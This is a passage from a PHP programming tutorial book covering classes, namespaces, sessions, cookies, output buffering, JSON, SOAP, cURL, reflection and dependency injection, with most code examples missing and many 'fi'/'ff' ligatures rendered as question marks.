A common pitfall of child classes is that, if your parent and child both contain a constructor( construct()) method, only the child class constructor will run. There may be occasions where you need to run the parent
 construct() method from it's child. If you need to do that, then you will need to use the parent:: scope resolutor:


Now harnessing that within a real-world situation would look something like:


The above will run the parent  construct() resulting in the echo being run.
Section 26.10: Dynamic Binding
Dynamic binding, also referred as method overriding is an example of run time polymorphism that occurs when multiple classes contain di?erent implementations of the same method, but the object that the method will be called on is unknown until run time.
This is useful if a certain condition dictates which class will be used to perform an action, where the action is named the same in both classes.




In the above example, the Animal class (Dog|Cat) which will makeNoise is unknown until run time depending on the property within the User class.
Section 26.11: $this, self and static plus the singleton

Use $this to refer to the current object. Use self to refer to the current class. In other words, use
$this->member for non-static members, use self::$member for static members.


In the example below, sayHello() and sayGoodbye() are using self and $this di?erence can be observed here.




static refers to whatever class in the hierarchy you called the method on. It allows for better reuse of static class properties when classes are inherited.

Consider the following code:


This doesn't produce the result you want:

unknown unknown unknown

That's because self refers to the Car class whenever method brand() is called. To refer to the correct class, you need to use static instead:




This does produce the desired output:

unknown BMW
Mercedes


See also Late static binding

The singleton

If you have an object that's expensive to create or represents a connection to some external resource you want to reuse, i.e. a database connection where there is no connection pooling or a socket to some other system, you can use the static and self keywords in a class to make it a singleton. There are strong opinions about whether the singleton pattern should or should not be used, but it does have its uses.


As you can see in the example code we are de?ning a private static property $instance to hold the object reference. Since this is static this reference is shared across ALL objects of this type.

The getInstance()method uses a method know as lazy instantiation to delay creating the object to the last possible moment as you do not want to have unused objects lying around in memory never intended to be used. It also saves time and CPU on page load not having to load more objects than necessary. The method is checking if the object is set, creating it if not, and returning it. This ensures that only one object of this kind is ever created.
We are also setting the constructor to be private to ensure that no one creates it with the new keyword from the outside. If you need to inherit from this class just change the private keywords to protected.
To use this object you just write the following:


Now I DO implore you to use dependency injection where you can and aim for loosely coupled objects, but sometimes that is just not reasonable and the singleton pattern can be of use.

Section 26.12: De?ning a Basic Class
An object in PHP contains variables and functions. Objects typically belong to a class, which de?nes the variables and functions that all objects of this class will contain.
The syntax to de?ne a class is:


Once a class is de?ned, you can create an instance using:


Variables and functions on the object are accessed like this:

Constructor

Classes can de?ne a special  construct() method, which is executed as part of object creation. This is often used to specify the initial values of an object:

Extending Another Class

Class de?nitions can extend existing class de?nitions, adding new variables and functions as well as modifying those de?ned in the parent class.
Here is a class that extends the previous example:




The Square class contains variables and behavior for both the Shape class and the Square class:


Section 26.13: Anonymous Classes
Anonymous classes were introduced into PHP 7 to enable for quick one-o? objects to be easily created. They can take constructor arguments, extend other classes, implement interfaces, and use traits just like normal classes can.
In its most basic form, an anonymous class looks like the following:


Nesting an anonymous class inside of another class does not give it access to private or protected methods or properties of that outer class. Access to protected methods and properties of the outer class can be gained by extending the outer class from the anonymous class. Access to private properties of the outer class can be gained by passing them through to the anonymous class's constructor.
For example:




Chapter 27: Namespaces
Section 27.1: Declaring namespaces
A namespace declaration can look as follows:

namespace MyProject; - Declare the namespace MyProject
namespace MyProject\Security\Cryptography; - Declare a nested namespace
namespace MyProject { ... } - Declare a namespace with enclosing brackets.

It is recommended to only declare a single namespace per ?le, even though you can declare as many as you like in a single ?le:


Every time you declare a namespace, classes you de?ne after that will belong to that namespace:


A namespace declaration can be used multiple times in di?erent ?les. The example above de?ned three classes in the MyProject\Shapes namespace in a single ?le. Preferably this would be split up into three ?les, each starting with namespace MyProject\Shapes;. This is explained in more detail in the PSR-4 standard example.
Section 27.2: Referencing a class or function in a namespace
As shown in Declaring Namespaces, we can de?ne a class in a namespace as follows:


To reference this class the full path (including the namespace) needs to be used:


This can be shortened by importing the class via the use-statement:


As for PHP 7.0 you can group various use-statements in one single statement using brackets:


Sometimes two classes have the same name. This is not a problem if they are in a di?erent namespace, but it could become a problem when attempting to import them with the use-statement:


This can be solved by de?ning a name for the alias yourself using the as keyword:


To reference a class outside the current namespace, it has to be escaped with a \, otherwise a relative namespace path is assumed from the current namespace:


Section 27.3: Declaring sub-namespaces
To declare a single namespace with hierarchy use following example:




The above example creates:

constant MyProject\Sub\Level\CONNECT_OK class MyProject\Sub\Level\Connection and function MyProject\Sub\Level\connect
Section 27.4: What are Namespaces?
The PHP community has a lot of developers creating lots of code. This means that one library's PHP code may use the same class name as another library. When both libraries are used in the same namespace, they collide and cause trouble.
Namespaces solve this problem. As described in the PHP reference manual, namespaces may be compared to operating system directories that namespace ?les; two ?les with the same name may co-exist in separate directories. Likewise, two PHP classes with the same name may co-exist in separate PHP namespaces.
It is important for you to namespace your code so that it may be used by other developers without fear of colliding with other libraries.

Chapter 28: Sessions
Section 28.1: session_start() Options
Starting with PHP Sessions we can pass an array with session-based php.ini options to the session_start
function.

Example


This feature also introduces a new php.ini setting named session.lazy_write, which defaults to true and means that session data is only rewritten, if it changes.

Referencing: https://wiki.php.net/rfc/session-lock-ini

Section 28.2: Session Locking
As we all are aware that PHP writes session data into a ?le at server side. When a request is made to php script which starts the session via session_start(), PHP locks this session ?le resulting to block/wait other incoming requests for same session_id to complete, because of which the other requests will get stuck on session_start() until or unless the session ?le locked is not released

The session ?le remains locked until the script is completed or session is manually closed. To avoid this situation i.e. to prevent multiple requests getting blocked, we can start the session and close the session which will release the lock from session ?le and allow to continue the remaining requests.


Now one will think if session is closed how we will read the session values, beautify even after session is closed, session is still available. So, we can still read the session data.


In php >= 7.0, we can have read_only session, read_write session and lazy_write session, so it may not required to use session_write_close()

Section 28.3: Manipulating session data
The $_SESSION variable is an array, and you can retrieve or manipulate it like a normal array.


Also see Manipulating an Array for more reference how to work on an array.

Note that if you store an object in a session, it can be retrieved gracefully only if you have an class autoloader or you have loaded the class already. Otherwise, the object will come out as the type  PHP_Incomplete_Class, which may later lead to crashes. See Namespacing and Autoloading about autoloading.

Warning:

Session data can be hijacked. This is outlined in: Pro PHP Security: From Application Security Principles to the Implementation of XSS Defense - Chapter 7: Preventing Session Hijacking So it can be strongly recommended to never store any personal information in $_SESSION. This would most critically include credit card numbers, government issued ids, and passwords; but would also extend into less assuming data like names, emails, phone numbers, etc which would allow a hacker to impersonate/compromise a legitimate user. As a general rule, use worthless/non- personal values, such as numerical identi?ers, in session data.
Section 28.4: Destroy an entire session
If you've got a session which you wish to destroy, you can do this with session_destroy()




Using session_destroy() is di?erent to using something like $_SESSION = array(); which will remove all of the values stored in the SESSION superglobal but it will not destroy the actual stored version of the session.

Note: We use $_SESSION = array(); instead of session_unset() because the manual stipulates:

Only use session_unset() for older deprecated code that does not use $_SESSION.

Section 28.5: Safe Session Start With no Errors
Many developers have this problem when they work on huge projects, especially if they work on some modular CMS on plugins, addons, components etc. Here is solution for safe session start where if ?rst checked PHP version to cover all versions and on next is checked if session is started. If session not exists then I start session safe. If session exists nothing happen.


This can help you a lot to avoid session_start error.
Section 28.6: Session name
Checking if session cookies have been created

Session name is the name of the cookie used to store sessions. You can use this to detect if cookies for a session have been created for the user:



Note that this method is generally not useful unless you really don't want to create cookies unnecessarily.

Changing session name

You can update the session name by calling session_name().


If no argument is provided into session_name() then the current session name is returned.

It should contain only alphanumeric characters; it should be short and descriptive (i.e. for users with enabled cookie warnings). The session name can't consist of digits only, at least one letter must be present. Otherwise a new session id is generated every time.

Chapter 29: Cookies
parameter	detail
The name of the cookie. This is also the key you can use to retrieve the value from the $_COOKIE super global. This is the only required parameter
The value to store in the cookie. This data is accessible to the browser so don't store anything sensitive here.
A Unix timestamp representing when the cookie should expire. If set to zero the cookie will expire at

expire


path


domain

the end of the session. If set to a number less than the current Unix timestamp the cookie will expire immediately.
The scope of the cookie. If set to / the cookie will be available within the entire domain. If set to /some- path/ then the cookie will only be available in that path and descendants of that path. Defaults to the current path of the ?le that the cookie is being set in.
The domain or subdomain the cookie is available on. If set to the bare domain stackoverflow.com then the cookie will be available to that domain and all subdomains. If set to a subdomain meta.stackoverflow.com then the cookie will be available only on that subdomain, and all sub- subdomains.

When set to TRUE the cookie will only be set if a secure HTTPS connection exists between the client and the server.
Speci?es that the cookie should only be made available through the HTTP/S protocol and should not be available to client side scripting languages like JavaScript. Only available in PHP 5.2 or later.

An HTTP cookie is a small piece of data sent from a website and stored on the user's computer by the user's web browser while the user is browsing.
Section 29.1: Modifying a Cookie
The value of a cookie can be modi?ed by resetting the cookie



Cookies are part of the HTTP header, so setcookie() must be called before any output is sent to the browser.


When modifying a cookie make sure the path and domain parameters of setcookie() matches the existing cookie or a new cookie will be created instead.


The value portion of the cookie will automatically be urlencoded when you send the cookie, and when it is received, it is automatically decoded and assigned to a variable by the same name as the cookie name

Section 29.2: Setting a Cookie
A cookie is set using the setcookie() function. Since cookies are part of the HTTP header, you must set any cookies before sending any output to the browser.

Example:

setcookie("user", "Tom", time() + 86400, "/"); // check syntax for function params

Description:

Creates a cookie with name user
(Optional) Value of the cookie is Tom
(Optional) Cookie will expire in 1 day (86400 seconds) (Optional) Cookie is available throughout the whole website / (Optional) Cookie is only sent over HTTPS
(Optional) Cookie is not accessible to scripting languages such as JavaScript


A created or modi?ed cookie can only be accessed on subsequent requests (where path and domain
matches) as the superglobal $_COOKIEis not populated with the new data immediately.

Section 29.3: Checking if a Cookie is Set
Use the isset() function upon the superglobal $_COOKIE variable to check if a cookie is set. Example:


Section 29.4: Removing a Cookie
To remove a cookie, set the expiry timestamp to a time in the past. This triggers the browser's removal mechanism:



When deleting a cookie make sure the path and domain parameters of setcookie() matches the cookie you're trying to delete or a new cookie, which expires immediately, will be created.

It is also a good idea to unset the $_COOKIE value in case the current page uses it:


Section 29.5: Retrieving a Cookie
Retrieve and Output a Cookie Named user

The value of a cookie can be retrieved using the global variable $_COOKIE. example if we have a cookie named user
we can retrieve it like this

echo $_COOKIE['user'];

Chapter 30: Output Bu?ering
Function	Details
ob_start()	Starts the output bu?er, any output placed after this will be captured and not displayed ob_get_contents() Returns all content captured by ob_start()
ob_end_clean()	Empties the output bu?er and turns it o? for the current nesting level ob_get_clean()	Triggers both ob_get_contents() and ob_end_clean()
ob_get_level()	Returns the current nesting level of the output bu?er
ob_?ush()	Flush the content bu?er and send it to the browser without ending the bu?er ob_implicit_?ush() Enables implicit ?ushing after every output call.
ob_end_?ush()	Flush the content bu?er and send it to the browser also ending the bu?er

Section 30.1: Basic usage getting content between bu?ers and clearing
Output bu?ering allows you to store any textual content (Text, HTML) in a variable and send to the browser as one piece at the end of your script. By default, php sends your content as it interprets it.


Any content outputted between ob_start() and ob_get_clean() will be captured and placed into the variable
$content.

Calling ob_get_clean() triggers both ob_get_contents() and ob_end_clean().
Section 30.2: Processing the bu?er via a callback
You can apply any kind of additional processing to the output by passing a callable to ob_start().




Output:


Section 30.3: Nested output bu?ers
You can nest output bu?ers and fetch the level for them to provide di?erent content using the ob_get_level()
function.




Outputs:


Section 30.4: Running output bu?er before any content


In this example we assume $users to be a multidimensional array, and we loop through it to ?nd all users with an access level of 7.

If there are no results, we redirect to an error page.

We are using the output bu?er here because we are triggering a header() redirect based on the result of the loop

Section 30.5: Stream output to client


Section 30.6: Using Output bu?er to store contents in a ?le, useful for reports, invoices etc


This example takes the complete document, and writes it to ?le, it does not output the document into the browser, but do by using echo $html;
Section 30.7: Typical usage and reasons for using ob_start
ob_start is especially handy when you have redirections on your page. For example, the following code won't work:


The error that will be given is something like: headers already sent by <xxx> on line <xxx>. In order to ?x this problem, you would write something like this at the start of your page:


And something like this at the end of your page:



This stores all generated content into an output bu?er, and displays it in one go. Hence, if you have any redirection calls on your page, those will trigger before any data is sent, removing the possibility of a headers already sent error occurring.
Section 30.8: Capturing the output bu?er to re-use later
In this example, we have an array containing some data.

We capture the output bu?er in $items_li_html and use it twice in the page.


Save the above code in a ?le output_buffer.php and run it via php output_buffer.php.

You should see the 2 list items we created above with the same list items we generated in PHP using the output bu?er:




Chapter 31: JSON
Parameter	Details
json_encode -
value	The value being encoded. Can be any type except a resource. All string data must be UTF-8 encoded.
Bitmask consisting of JSON_HEX_QUOT, JSON_HEX_TAG, JSON_HEX_AMP, JSON_HEX_APOS,

options

JSON_NUMERIC_CHECK, JSON_PRETTY_PRINT, JSON_UNESCAPED_SLASHES, JSON_FORCE_OBJECT, JSON_PRESERVE_ZERO_FRACTION, JSON_UNESCAPED_UNICODE, JSON_PARTIAL_OUTPUT_ON_ERROR.
The behaviour of these constants is described on the JSON constants page.

depth	Set the maximum depth. Must be greater than zero.
json_decode -
json	The json string being decoded. This function only works with UTF-8 encoded strings. assoc	Should function return associative array instead of objects.
Bitmask of JSON decode options. Currently only JSON_BIGINT_AS_STRING is supported (default is to cast large integers as ?oats)

JSON (JavaScript Object Notation) is a platform and language independent way of serializing objects into plaintext. Because it is often used on web and so is PHP, there is a basic extension for working with JSON in PHP.
Section 31.1: Decoding a JSON string
The json_decode() function takes a JSON-encoded string as its ?rst parameter and parses it into a PHP variable.

Normally, json_decode() will return an object of \stdClass if the top level item in the JSON object is a dictionary or an indexed array if the JSON object is an array. It will also return scalar values or NULL for certain scalar values, such as simple strings, "true", "false", and "null". It also returns NULL on any error.


Use var_dump() to view the types and values of each property on the object we decoded above.


Output (note the variable types):




Note: The variable types in JSON were converted to their PHP equivalent.

To return an associative array for JSON objects instead of returning an object, pass true as the second parameter to json_decode().


Output (note the array associative structure):


The second parameter ($assoc) has no e?ect if the variable to be returned is not an object.

Note: If you use the $assoc parameter, you will lose the distinction between an empty array and an empty object. This means that running json_encode() on your decoded output again, will result in a di?erent JSON structure.
If the JSON string has a "depth" more than 512 elements (20 elements in versions older than 5.2.3, or 128 in version 5.2.3) in recursion, the function json_decode() returns NULL. In versions 5.3 or later, this limit can be controlled using the third parameter ($depth), as discussed below.
According to the manual:

PHP implements a superset of JSON as speci?ed in the original " RFC 4627 - it will also encode and decode scalar types and NULL. RFC 4627 only supports these values when they are nested inside an array or an object. Although this superset is consistent with the expanded de?nition of "JSON text" in the newer
" RFC 7159 (which aims to supersede RFC 4627) and " ECMA-404, this may cause interoperability issues with older JSON parsers that adhere strictly to RFC 4627 when encoding a single scalar value.

This means, that, for example, a simple string will be considered to be a valid JSON object in PHP:


Output:


But simple strings, not in an array or object, are not part of the RFC 4627 standard. As a result, such online checkers as JSLint, JSON Formatter & Validator (in RFC 4627 mode) will give you an error.

There is a third $depth parameter for the depth of recursion (the default value is 512), which means the amount of nested objects inside the original object to be decoded.

There is a fourth $options parameter. It currently accepts only one value, JSON_BIGINT_AS_STRING. The default behavior (which leaves o? this option) is to cast large integers to ?oats instead of strings.

Invalid non-lowercased variants of the true, false and null literals are no longer accepted as valid input.


So this example:


Before PHP 5.6:


And after:


Similar behavior occurs for false and null.

Note that json_decode() will return NULL if the string cannot be converted.




It is not safe to rely only on the return value being NULL to detect errors. For example, if the JSON string contains nothing but "null", json_decode() will return null, even though no error occurred.
Section 31.2: Encoding a JSON string
The json_encode function will convert a PHP array (or, since PHP 5.4, an object which implements the JsonSerializable interface) to a JSON-encoded string. It returns a JSON-encoded string on success or FALSE on failure.


During encoding, the PHP data types string, integer, and boolean are converted to their JSON equivalent. Associative arrays are encoded as JSON objects, and - when called with default arguments - indexed arrays are encoded as JSON arrays. (Unless the array keys are not a continuous numeric sequence starting from 0, in which case the array will be encoded as a JSON object.)


Output:


Arguments

Since PHP 5.3, the second argument to json_encode is a bitmask which can be one or more of the following. As with any bitmask, they can be combined with the binary OR operator |.
PHP 5.x Version = 5.3
JSON_FORCE_OBJECT

Forces the creation of an object instead of an array


Output:


JSON_HEX_TAG, JSON_HEX_AMP, JSON_HEX_APOS, JSON_HEX_QUOT

Ensures the following conversions during encoding:

Constant	Input Output
JSON_HEX_TAG < \u003C JSON_HEX_TAG > \u003E JSON_HEX_AMP & \u0026 JSON_HEX_APOS ' \u0027 JSON_HEX_QUOT "  \u0022




Output:

PHP 5.x Version = 5.3
JSON_NUMERIC_CHECK

Ensures numeric strings are converted to integers.


Output:

PHP 5.x Version = 5.4
JSON_PRETTY_PRINT

Makes the JSON easily readable


Output:


JSON_UNESCAPED_SLASHES

Includes unescaped / forward slashes in the output


Output:



JSON_UNESCAPED_UNICODE

Includes UTF8-encoded characters in the output instead of \u-encoded strings


Output:

PHP 5.x Version = 5.5
JSON_PARTIAL_OUTPUT_ON_ERROR

Allows encoding to continue if some unencodable values are encountered.


Output:

PHP 5.x Version = 5.6
JSON_PRESERVE_ZERO_FRACTION

Ensures that ?oats are always encoded as ?oats.


Output:

PHP 7.x Version = 7.1
JSON_UNESCAPED_LINE_TERMINATORS

When used with JSON_UNESCAPED_UNICODE, reverts to the behaviour of older PHP versions, and does not escape the characters U+2028 LINE SEPARATOR and U+2029 PARAGRAPH SEPARATOR. Although valid in JSON, these characters are not valid in JavaScript, so the default behaviour of JSON_UNESCAPED_UNICODE was changed in version 7.1.


Output:




Section 31.3: Debugging JSON errors
When json_encode or json_decode fails to parse the string provided, it will return false. PHP itself will not raise any errors or warnings when this happens, the onus is on the user to use the json_last_error() and json_last_error_msg() functions to check if an error occurred and act accordingly in your application (debug it, show an error message, etc.).
The following example shows a common error when working with JSON, a failure to decode/encode a JSON string
(due to the passing of a bad UTF-8 encoded string, for example).


json_last_error_msg

json_last_error_msg() returns a human readable message of the last error that occurred when trying to encode/decode a string.

This function will always return a string, even if no error occurred. The default non-error string is No Error
It will return false if some other (unknown) error occurred
Careful when using this in loops, as json_last_error_msg will be overridden on each iteration.

You should only use this function to get the message for display, not to test against in control statements.


This function doesn't exist before PHP 5.5. Here is a poly?ll implementation:




json_last_error

json_last_error() returns an integer mapped to one of the pre-de?ned constants provided by PHP.

Constant	Meaning
JSON_ERROR_NONE	No error has occurred
JSON_ERROR_DEPTH	The maximum stack depth has been exceeded
JSON_ERROR_STATE_MISMATCH	Invalid or malformed JSON
JSON_ERROR_CTRL_CHAR	Control character error, possibly incorrectly encoded
JSON_ERROR_SYNTAX	Syntax error (since PHP 5.3.3)
JSON_ERROR_UTF8	Malformed UTF-8 characters, possibly incorrectly encoded (since PHP 5.5.0) JSON_ERROR_RECURSION	One or more recursive references in the value to be encoded JSON_ERROR_INF_OR_NAN	One or more NAN or INF values in the value to be encoded JSON_ERROR_UNSUPPORTED_TYPE A value of a type that cannot be encoded was given
Section 31.4: Using JsonSerializable in an Object
PHP 5.x Version = 5.4

When you build REST API's, you may need to reduce the information of an object to be passed to the client application. For this purpose, this example illustrates how to use the JsonSerialiazble interface.
In this example, the class User actually extends a DB model object of a hypotetical ORM.


Add JsonSerializable implementation to the class, by providing the jsonSerialize() method.


Now in your application controller or script, when passing the object User to json_encode() you will get the return json encoded array of the jsonSerialize() method instead of the entire object.



Will return:


properties values example.

This will both reduce the amount of data returned from a RESTful endpoint, and allow to exclude object properties from a json representation.

Using Private and Protected Properties with json_encode()

To avoid using JsonSerializable, it is also possible to use private or protected properties to hide class information from json_encode() output. The Class then does not need to implement \JsonSerializable.

The json_encode() function will only encode public properties of a class into JSON.



Output:

Section 31.5: Header json and the returned response
By adding a header with content type as JSON:




The header is there so your app can detect what data was returned and how it should handle it.
Note that: the content header is just information about type of returned data.

If you are using UTF-8, you can use:


Example jQuery:


Chapter 32: SOAP Client
Parameter	Details
$wsdl	URI of WSDL or NULL if using non-WSDL mode
Array of options for SoapClient. Non-WSDL mode requires location and uri to set, all other options are optional. See table below for possible values.

Section 32.1: WSDL Mode
First, create a new SoapClient object, passing the URL to the WSDL ?le and optionally, an array of options.


Then use the $soap object to call your SOAP methods.


Section 32.2: Non-WSDL Mode
This is similar to WSDL mode, except we pass NULL as the WSDL ?le and make sure to set the location and uri
options.


Section 32.3: Classmaps
When creating a SOAP Client in PHP, you can also set a classmap key in the con?guration array. This classmap de?nes which types de?ned in the WSDL should be mapped to actual classes, instead of the default StdClass. The reason you would want to do this is because you can get auto-completion of ?elds and method calls on these classes, instead of having to guess which ?elds are set on the regular StdClass.




After con?guring the classmap, whenever you perform a certain operation that returns a type Address or Book, the SoapClient will instantiate that class, ?ll the ?elds with the data and return it from the operation call.


Section 32.4: Tracing SOAP request and response
Sometimes we want to look at what is sent and received in the SOAP request. The following methods will return the XML in the request and response:


For example, suppose we have an ENVIRONMENT constant and when this constant's value is set to DEVELOPMENT we want to echo all information when the call to getAddress throws an error. One solution could be:




Chapter 33: Using cURL in PHP
Parameter	Details
curl_init	-- Initialize a cURL session
url	The url to be used in the cURL request
curl_setopt -- Set an option for a cURL transfer
ch	The cURL handle (return value from curl_init())
option	CURLOPT_XXX to be set - see PHP documentation for the list of options and acceptable values value	The value to be set on the cURL handle for the given option
curl_exec	-- Perform a cURL session
ch	The cURL handle (return value from curl_init()) curl_close	-- Close a cURL session
ch	The cURL handle (return value from curl_init())

Section 33.1: Basic Usage (GET Requests)
cURL is a tool for transferring data with URL syntax. It support HTTP, FTP, SCP and many others(curl >= 7.19.4).
Remember, you need to install and enable the cURL extension to use it.


Section 33.2: POST Requests
If you want to mimic HTML form POST action, you can use cURL.




Section 33.3: Using Cookies
cURL can keep cookies received in responses for use with subsequent requests. For simple session cookie handling in memory, this is achieved with a single line of code:


In cases where you are required to keep cookies after the cURL handle is destroyed, you can specify the ?le to store them in:


Then, when you want to use them again, pass them as the cookie ?le:


Remember, though, that these two steps are not necessary unless you need to carry cookies between di?erent cURL handles. For most use cases, setting CURLOPT_COOKIEFILE to the empty string is all you need.
Cookie handling can be used, for example, to retrieve resources from a web site that requires a login. This is typically a two-step procedure. First, POST to the login page.


The second step (after standard error checking is done) is usually a simple GET request. The important thing is to reuse the existing cURL handle for the second request. This ensures the cookies from the ?rst response will be automatically included in the second request.


This is only intended as an example of cookie handling. In real life, things are usually more complicated. Often you must perform an initial GET of the login page to pull a login token that needs to be included in your POST. Other sites might block the cURL client based on its User-Agent string, requiring you to change it.

Section 33.4: Using multi_curl to make multiple POST requests
Sometimes we need to make a lot of POST requests to one or many di?erent endpoints. To deal with this scenario, we can use multi_curl.
First of all, we create how many requests as needed exactly in the same way of the simple example and put them in an array.
We use the curl_multi_init and add each handle to it.

In this example, we are using 2 di?erent endpoints:




Then, we use curl_multi_exec to send the requests

//running the requests
$running = null; do {
curl_multi_exec($mh, $running);
} while ($running);

//getting the responses
foreach(array_keys($chs) as $key){
$error = curl_error($chs[$key]);
$last_effective_URL = curl_getinfo($chs[$key], CURLINFO_EFFECTIVE_URL);
$time = curl_getinfo($chs[$key], CURLINFO_TOTAL_TIME);
$response = curl_multi_getcontent($chs[$key]); // get results
if (!empty($error)) {
echo "The request $key return a error: $error" . "\n";
}
else {
echo "The request to '$last_effective_URL' returned '$response' in $time seconds." . "\n";
}

curl_multi_remove_handle($mh, $chs[$key]);
}

// close current handler
curl_multi_close($mh);

A possible return for this example could be:

The request to 'http://www.example.com' returned 'fruits' in 2 seconds. The request to 'http://www.example2.com' returned 'seafood' in 5 seconds.

Section 33.5: Sending multi-dimensional data and multiple ?les with CurlFile in one request
Let's say we have a form like the one below. We want to send the data to our webserver via AJAX and from there to a script running on an external server.



So we have normal inputs, a multi-select ?eld and a ?le dropzone where we can upload multiple ?les.

Assuming the AJAX POST request was successful we get the following data on PHP site:


and the ?les should look like this




So far, so good. Now we want to send this data and ?les to the external server using cURL with the CurlFile Class Since cURL only accepts a simple but not a multi-dimensional array, we have to ?atten the $_POST array ?rst.
To do this, you could use this function for example which gives you the following:


The next step is to create CurlFile Objects for the uploaded ?les. This is done by the following loop:


curl_?le_create is a helper function of the CurlFile Class and creates the CurlFile objects. We save each object in the

$?les array with keys named "upload[0]" and "upload[1]" for our two ?les.

We now have to combine the ?attened post array and the ?les array and save it as $data like this:


The last step is to send the cURL request:


Since $data is now a simple (?at) array, cURL automatically sends this POST request with Content Type: multipart/form-data
In upload.php on the external server you can now get the post data and ?les with $_POST and $_FILES as you would normally do.

Section 33.6: Creating and sending a request with a custom method
By default, PHP Curl supports GET and POST requests. It is possible to also send custom requests, such as DELETE, PUT or PATCH (or even non-standard methods) using the CURLOPT_CUSTOMREQUEST parameter.


Section 33.7: Get and Set custom http headers in php
Sending The Request Header


Reading the custom header


Output:


We can also send the header using below syntax:


Chapter 34: Re?ection
Section 34.1: Feature detection of classes or objects
Feature detection of classes can partly be done with the property_exists and method_exists functions.

class MyClass {
public $public_field; protected $protected_field; private $private_field; static $static_field;
const CONSTANT = 0;
public function public_function() {} protected function protected_function() {} private function private_function() {} static function static_function() {}
}

// check properties
$check = property_exists('MyClass', 'public_field');	// true
$check = property_exists('MyClass', 'protected_field'); // true
$check = property_exists('MyClass', 'private_field');	// true, as of PHP 5.3.0
$check = property_exists('MyClass', 'static_field');	// true
$check = property_exists('MyClass', 'other_field');	// false

// check methods
$check = method_exists('MyClass', 'public_function');	// true
$check = method_exists('MyClass', 'protected_function');	// true
$check = method_exists('MyClass', 'private_function');	// true
$check = method_exists('MyClass', 'static_function');	// true

// however...
$check = property_exists('MyClass', 'CONSTANT'); // false
$check = property_exists($object, 'CONSTANT');	// false

With a ReflectionClass, also constants can be detected:


Note: for property_exists and method_exists, also an object of the class of interest can be provided instead of the class name. Using re?ection, the ReflectionObject class should be used instead of ReflectionClass.
Section 34.2: Testing private/protected methods
Sometimes it's useful to test private & protected methods as well as public ones.




Easiest way to test drive method is using re?ection


If the method is static you pass null in the place of the class instance




Section 34.3: Accessing private and protected member variables
Re?ection is often used as part of software testing, such as for the runtime creation/instantiation of mock objects. It's also great for inspecting the state of an object at any given point in time. Here's an example of using Re?ection in a unit test to verify a protected class member contains the expected value.
Below is a very basic class for a Car. It has a protected member variable that will contain the value representing the color of the car. Because the member variable is protected we cannot access it directly and must use a getter and setter method to retrieve and set its value respectively.


To test this many developers will create a Car object, set the car's color using Car::setColor(), retrieve the color using Car::getColor(), and compare that value to the color they set:


On the surface this seems okay. After all, all Car::getColor() does is return the value of the protected member variable Car::$color. But this test is ?awed in two ways:

1. It exercises Car::getColor() which is out of the scope of this test
2. It depends on Car::getColor() which may have a bug itself which can make the test have a false positive or negative

Let's look at why we shouldn't use Car::getColor() in our unit test and should use Re?ection instead. Let's say a developer is assigned a task to add "Metallic" to every car color. So they attempt to modify the Car::getColor() to prepend "Metallic" to the car's color:



Do you see the error? The developer used a semi-colon instead of the concatenation operator in an attempt to prepend "Metallic" to the car's color. As a result, whenever Car::getColor() is called, "Metallic " will be returned regardless of what the car's actual color is. As a result our Car::setColor() unit test will fail even though Car::setColor() works perfectly ?ne and was not a?ected by this change.
So how do we verify Car::$color contains the value we are setting via Car::setColor()? We can use Refelection to inspect the protected member variable directly. So how do we do that? We can use Refelection to make the protected member variable accessible to our code so it can retrieve the value.

Let's see the code ?rst and then break it down:


Here is how we are using Re?ection to get the value of Car::$color in the code above:

1. We create a new Re?ectionObject representing our Car object
2. We get a Re?ectionProperty for Car::$color (this "represents" the Car::$color variable)
3. We make Car::$color accessible
4. We get the value of Car::$color

As you can see by using Re?ection we could get the value of Car::$color without having to call Car::getColor() or any other accessor function which could cause invalid test results. Now our unit test for Car::setColor() is safe and accurate.

Chapter 35: Dependency Injection
Dependency Injection (DI) is a fancy term for "passing things in". All it really means is passing the dependencies of an object via the constructor and / or setters instead of creating them upon object creation inside the object.
Dependency Injection might also refer to Dependency Injection Containers which automate the construction and injection.
Section 35.1: Constructor Injection
Objects will often depend on other objects. Instead of creating the dependency in the constructor, the dependency should be passed into the constructor as a parameter. This ensures there is not tight coupling between the objects, and enables changing the dependency upon class instantiation. This has a number of bene?ts, including making code easier to read by making the dependencies explicit, as well as making testing simpler since the dependencies can be switched out and mocked more easily.
In the following example, Component will depend on an instance of Logger, but it doesn't create one. It requires one to be passed as argument to the constructor instead.


Without dependency injection, the code would probably look similar to:


Using new to create new objects in the constructor indicates that dependency injection was not used (or was used incompletely), and that the code is tightly coupled. It is also a sign that the code is incompletely tested or may have brittle tests that make incorrect assumptions about program state.
In the above example, where we are using dependency injection instead, we could easily change to a di?erent Logger if doing so became necessary. For example, we might use a Logger implementation that logs to a di?erent location, or that uses a di?erent logging format, or that logs to the database instead of to a ?le.
Section 35.2: Setter Injection
Dependencies can also be injected by setters.




This is especially interesting when the core functionality of the class does not rely on the dependency to work.

Here, the only needed dependency is the DatabaseConnection so it's in the constructor. The Logger dependency is optional and thus does not need to be part of the constructor, making the class easier to use.

Note that when using setter injection, it's better to extend the functionality rather than replacing it. When setting a dependency, there's nothing con?rming that the dependency won't change at some point, which could lead in unexpected results. For example, a FileLogger could be set at ?rst, and then a MailLogger could be set. This breaks encapsulation and makes logs hard to ?nd, because we're replacing the dependency.

To prevent this, we should add a dependency with setter injection, like so:




Like this, whenever we'll use the core functionality, it won't break even if there is no logger dependency added, and any logger added will be used even though another logger could've been added. We're extending functionality instead of replacing it.
Section 35.3: Container Injection
Dependency Injection (DI) in the context of using a Dependency Injection Container (DIC) can be seen as a superset of constructor injection. A DIC will typically analyze a class constructor's typehints and resolve its needs, e?ectively injecting the dependencies needed for the instance execution.
The exact implementation goes well beyond the scope of this document but at its very heart, a DIC relies on using the signature of a class...


... to automatically instantiate it, relying most of the time on an autoloading system.


If you are using PHP in version at least 5.5 and want to get a name of a class in a way that's being shown above, the correct way is the second approach. That way you can quickly ?nd usages of the class using modern IDEs, which will greatly help you with potential refactoring. You do not want to rely on regular strings.
In this case, the Documentation\Example knows it needs a Meaning, and a DIC would in turn instantiate a Meaning
type. The concrete implementation need not depend on the consuming instance.

Instead, we set rules in the container, prior to object creation, that instructs how speci?c types should be instantiated if need be.
This has a number of advantages, as a DIC can

Share common instances
Provide a factory to resolve a type signature Resolve an interface signature
If we de?ne rules about how speci?c type needs to be managed we can achieve ?ne control over which types are shared, instantiated, or created from a factory.

Chapter 36: XML
Section 36.1: Create a XML using DomDocument
To create a XML using DOMDocument,basically, we need to create all the tags and attributes using the
createElement() and createAttribute() methods and them create the XML structure with the appendChild(). The example below includes tags, attributes, a CDATA section and a di?erent namespace for the second tag:
